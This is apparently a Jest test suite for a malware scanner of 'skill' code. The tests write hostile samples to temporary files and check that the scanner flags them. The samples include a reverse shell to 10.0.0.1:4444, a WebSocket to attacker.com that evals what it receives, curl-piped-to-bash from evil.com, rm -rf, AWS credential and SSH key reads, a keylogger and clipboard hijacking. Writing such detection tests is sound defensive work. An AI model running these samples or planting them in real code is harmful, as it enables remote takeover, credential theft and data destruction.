import { describe, it, expect } from '@jest/globals';
import EnhancedSkillScanner from '../scanner.js';
import fs from 'fs';
import path from 'path';

describe('Enhanced Skill Scanner - Anti-Virus Tests', () => {
  let scanner;

  beforeEach(() => {
    scanner = new EnhancedSkillScanner();
  });

  describe('Malware Detection', () => {
    it('should detect eval(atob()) malware pattern', async () => {
      const maliciousCode = `
        const payload = eval(atob("ZXZhbCgiYWxlcnQoJ2hhY2tlZCcpIik="));
      `;
      
      fs.writeFileSync('/tmp/malware-test.js', maliciousCode);
      const result = await scanner.scanSkill('/tmp/malware-test.js');
      
      expect(result.malwareDetected).toBe(true);
      expect(result.threatLevel).toBe('SEVERE');
      expect(result.criticalIssues).toBeGreaterThan(0);
      
      fs.unlinkSync('/tmp/malware-test.js');
    });

    it('should detect Function(atob()) pattern', async () => {
      const maliciousCode = `
        const evil = Function(atob("cmV0dXJuIDE7"));
      `;
      
      fs.writeFileSync('/tmp/function-malware.js', maliciousCode);
      const result = await scanner.scanSkill('/tmp/function-malware.js');
      
      expect(result.malwareDetected).toBe(true);
      expect(result.threatLevel).toBe('SEVERE');
      
      fs.unlinkSync('/tmp/function-malware.js');
    });
  });

  describe('Wallet Theft Detection', () => {
    it('should detect private key access', async () => {
      const walletCode = `
        const privateKey = process.env.PRIVATE_KEY;
        const seedPhrase = "word1 word2 word3...";
      `;
      
      fs.writeFileSync('/tmp/wallet-theft.js', walletCode);
      const result = await scanner.scanSkill('/tmp/wallet-theft.js');
      
      expect(result.criticalIssues).toBeGreaterThan(0);
      expect(result.findings.some(f => f.code === 'WALLET_ACCESS')).toBe(true);
      
      fs.unlinkSync('/tmp/wallet-theft.js');
    });

    it('should detect Ethereum addresses', async () => {
      const addressCode = `
        const wallet = "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb";
      `;
      
      fs.writeFileSync('/tmp/eth-address.js', addressCode);
      const result = await scanner.scanSkill('/tmp/eth-address.js');
      
      expect(result.findings.some(f => f.code === 'WALLET_ACCESS')).toBe(true);
      
      fs.unlinkSync('/tmp/eth-address.js');
    });
  });

  describe('Keylogger Detection', () => {
    it('should detect keyboard event listeners', async () => {
      const keyloggerCode = `
        document.addEventListener('keydown', (e) => {
          sendToServer(e.key);
        });
      `;
      
      fs.writeFileSync('/tmp/keylogger.js', keyloggerCode);
      const result = await scanner.scanSkill('/tmp/keylogger.js');
      
      expect(result.criticalIssues).toBeGreaterThan(0);
      expect(result.findings.some(f => f.code === 'KEYLOGGER')).toBe(true);
      
      fs.unlinkSync('/tmp/keylogger.js');
    });
  });

  describe('Backdoor Detection', () => {
    it('should detect reverse shell patterns', async () => {
      const backdoorCode = `
        const net = require('net');
        const shell = net.connect(4444, '10.0.0.1', function() {
          this.pipe(require('child_process').spawn('/bin/sh', []));
        });
      `;
      
      fs.writeFileSync('/tmp/backdoor.js', backdoorCode);
      const result = await scanner.scanSkill('/tmp/backdoor.js');
      
      expect(result.criticalIssues).toBeGreaterThan(0);
      expect(result.findings.some(f => f.code === 'BACKDOOR')).toBe(true);
      
      fs.unlinkSync('/tmp/backdoor.js');
    });

    it('should detect WebSocket listeners', async () => {
      const wsBackdoor = `
        const ws = new WebSocket('ws://attacker.com:8080');
        ws.onmessage = (msg) => eval(msg.data);
      `;
      
      fs.writeFileSync('/tmp/ws-backdoor.js', wsBackdoor);
      const result = await scanner.scanSkill('/tmp/ws-backdoor.js');
      
      expect(result.criticalIssues).toBeGreaterThan(0);
      
      fs.unlinkSync('/tmp/ws-backdoor.js');
    });
  });

  describe('Surveillance Detection', () => {
    it('should detect screen capture attempts', async () => {
      const spywareCode = `
        const { desktopCapturer } = require('electron');
        desktopCapturer.getSources({ types: ['screen'] });
      `;
      
      fs.writeFileSync('/tmp/spyware.js', spywareCode);
      const result = await scanner.scanSkill('/tmp/spyware.js');
      
      expect(result.criticalIssues).toBeGreaterThan(0);
      expect(result.findings.some(f => f.code === 'SURVEILLANCE')).toBe(true);
      
      fs.unlinkSync('/tmp/spyware.js');
    });
  });

  describe('Clipboard Hijacking Detection', () => {
    it('should detect clipboard access', async () => {
      const clipboardCode = `
        navigator.clipboard.writeText('0xATTACKER_ADDRESS');
      `;
      
      fs.writeFileSync('/tmp/clipboard.js', clipboardCode);
      const result = await scanner.scanSkill('/tmp/clipboard.js');
      
      expect(result.criticalIssues).toBeGreaterThan(0);
      expect(result.findings.some(f => f.code === 'CLIPBOARD_ACCESS')).toBe(true);
      
      fs.unlinkSync('/tmp/clipboard.js');
    });
  });

  describe('Credential Theft Detection', () => {
    it('should detect AWS credential access', async () => {
      const credTheftCode = `
        const creds = fs.readFileSync('~/.aws/credentials', 'utf8');
      `;
      
      fs.writeFileSync('/tmp/cred-theft.js', credTheftCode);
      const result = await scanner.scanSkill('/tmp/cred-theft.js');
      
      expect(result.criticalIssues).toBeGreaterThan(0);
      expect(result.findings.some(f => f.code === 'CREDENTIAL_THEFT')).toBe(true);
      
      fs.unlinkSync('/tmp/cred-theft.js');
    });

    it('should detect SSH key access', async () => {
      const sshTheftCode = `
        const privateKey = fs.readFileSync('~/.ssh/id_rsa');
      `;
      
      fs.writeFileSync('/tmp/ssh-theft.js', sshTheftCode);
      const result = await scanner.scanSkill('/tmp/ssh-theft.js');
      
      expect(result.criticalIssues).toBeGreaterThan(0);
      
      fs.unlinkSync('/tmp/ssh-theft.js');
    });
  });

  describe('Suspicious Domain Detection', () => {
    it('should detect pastebin connections', async () => {
      const pastebinCode = `
        fetch('https://pastebin.com/raw/evil123');
      `;
      
      fs.writeFileSync('/tmp/pastebin.js', pastebinCode);
      const result = await scanner.scanSkill('/tmp/pastebin.js');
      
      expect(result.criticalIssues).toBeGreaterThan(0);
      expect(result.findings.some(f => f.code === 'SUSPICIOUS_DOMAIN')).toBe(true);
      
      fs.unlinkSync('/tmp/pastebin.js');
    });

    it('should detect ngrok tunnels', async () => {
      const ngrokCode = `
        const tunnel = 'https://abc123.ngrok.io/callback';
      `;
      
      fs.writeFileSync('/tmp/ngrok.js', ngrokCode);
      const result = await scanner.scanSkill('/tmp/ngrok.js');
      
      expect(result.criticalIssues).toBeGreaterThan(0);
      
      fs.unlinkSync('/tmp/ngrok.js');
    });
  });

  describe('Shell Script Analysis', () => {
    it('should detect destructive rm commands', async () => {
      const destructiveScript = `#!/bin/bash
        rm -rf /important/data
      `;
      
      fs.writeFileSync('/tmp/destructive.sh', destructiveScript);
      const result = await scanner.scanSkill('/tmp/destructive.sh');
      
      expect(result.criticalIssues).toBeGreaterThan(0);
      expect(result.findings.some(f => f.code === 'DANGEROUS_SHELL_COMMAND')).toBe(true);
      
      fs.unlinkSync('/tmp/destructive.sh');
    });

    it('should detect remote script execution', async () => {
      const remoteExecScript = `#!/bin/bash
        curl https://evil.com/script.sh | bash
      `;
      
      fs.writeFileSync('/tmp/remote-exec.sh', remoteExecScript);
      const result = await scanner.scanSkill('/tmp/remote-exec.sh');
      
      expect(result.criticalIssues).toBeGreaterThan(0);
      
      fs.unlinkSync('/tmp/remote-exec.sh');
    });
  });

  describe('Code Obfuscation Detection', () => {
    it('should detect base64 obfuscation', async () => {
      const obfuscatedCode = `
        const decoded = atob('bWFsaWNpb3VzIGNvZGU=');
        eval(decoded);
      `;
      
      fs.writeFileSync('/tmp/obfuscated.js', obfuscatedCode);
      const result = await scanner.scanSkill('/tmp/obfuscated.js');
      
      expect(result.criticalIssues).toBeGreaterThan(0);
      expect(result.findings.some(f => f.code === 'OBFUSCATION')).toBe(true);
      
      fs.unlinkSync('/tmp/obfuscated.js');
    });

    it('should detect hex encoding', async () => {
      const hexCode = `
        const payload = '\\x65\\x76\\x61\\x6c';
      `;
      
      fs.writeFileSync('/tmp/hex.js', hexCode);
      const result = await scanner.scanSkill('/tmp/hex.js');
      
      expect(result.criticalIssues).toBeGreaterThan(0);
      
      fs.unlinkSync('/tmp/hex.js');
    });
  });

  describe('Safe Code Detection', () => {
    it('should pass clean code with high score', async () => {
      const cleanCode = `
        export default function hello() {
          console.log('Hello, world!');
          return 42;
        }
      `;
      
      fs.writeFileSync('/tmp/clean.js', cleanCode);
      const result = await scanner.scanSkill('/tmp/clean.js');
      
      expect(result.safetyScore).toBeGreaterThanOrEqual(80);
      expect(result.threatLevel).toBe('SAFE');
      expect(result.criticalIssues).toBe(0);
      
      fs.unlinkSync('/tmp/clean.js');
    });

    it('should handle empty files', async () => {
      fs.writeFileSync('/tmp/empty.js', '');
      const result = await scanner.scanSkill('/tmp/empty.js');
      
      expect(result.safetyScore).toBe(100);
      expect(result.threatLevel).toBe('SAFE');
      
      fs.unlinkSync('/tmp/empty.js');
    });
  });

  describe('Threat Level Classification', () => {
    it('should classify SEVERE threat correctly', async () => {
      const severeCode = `
        eval(atob('malware'));
        const privateKey = 'leaked';
        document.addEventListener('keydown', spy);
        navigator.clipboard.writeText('hack');
        fetch('https://pastebin.com/evil');
      `;
      
      fs.writeFileSync('/tmp/severe.js', severeCode);
      const result = await scanner.scanSkill('/tmp/severe.js');
      
      expect(result.threatLevel).toBe('SEVERE');
      expect(result.criticalIssues).toBeGreaterThanOrEqual(5);
      
      fs.unlinkSync('/tmp/severe.js');
    });

    it('should classify MEDIUM threat correctly', async () => {
      const mediumCode = `
        eval('1 + 1');
        fetch('https://api.example.com/data');
      `;
      
      fs.writeFileSync('/tmp/medium.js', mediumCode);
      const result = await scanner.scanSkill('/tmp/medium.js');
      
      expect(['MEDIUM', 'HIGH']).toContain(result.threatLevel);
      
      fs.unlinkSync('/tmp/medium.js');
    });
  });

  describe('Report Generation', () => {
    it('should generate comprehensive report', async () => {
      const testCode = `
        eval('test');
        fetch('https://example.com');
        const key = process.env.API_KEY;
      `;
      
      fs.writeFileSync('/tmp/report-test.js', testCode);
      const result = await scanner.scanSkill('/tmp/report-test.js');
      
      expect(result).toHaveProperty('safetyScore');
      expect(result).toHaveProperty('threatLevel');
      expect(result).toHaveProperty('rating');
      expect(result).toHaveProperty('emoji');
      expect(result).toHaveProperty('criticalIssues');
      expect(result).toHaveProperty('warningIssues');
      expect(result).toHaveProperty('infoIssues');
      expect(result).toHaveProperty('totalFindings');
      expect(result).toHaveProperty('malwareDetected');
      expect(result).toHaveProperty('summary');
      expect(result).toHaveProperty('findings');
      
      fs.unlinkSync('/tmp/report-test.js');
    });
  });
});
